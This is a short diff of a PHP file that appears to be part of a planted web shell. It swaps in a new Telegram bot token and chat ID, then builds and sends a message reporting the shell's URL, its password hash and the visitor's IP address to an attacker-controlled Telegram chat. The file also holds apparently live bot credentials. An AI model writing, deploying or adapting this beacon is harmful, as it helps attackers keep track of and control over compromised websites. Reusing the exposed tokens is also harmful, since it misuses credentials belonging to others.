@@ -1,8 +1,8 @@
 <?php
 $hashed_password = '$2y$10$QVpvHdIVCl6XsPh5c1.myO/rKnmpQdjJo6BH0lgemCyY0NJDjvlLu';
 
-$botToken = '8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc';
-$chatId = '5070938778';
+$botToken = '8736893468:AAES7SDhx4t2wrrpzKqe9UC8d1P21ki5xQI';
+$chatId = '8930174463';
 $xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $logMessage  = "___UBK3___ \n\n Shell nya =\n $xPath \n\n Password =\n $hashed_password \n\n IP Hacker  :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 sendTelegramMessage($botToken, $chatId, $logMessage);
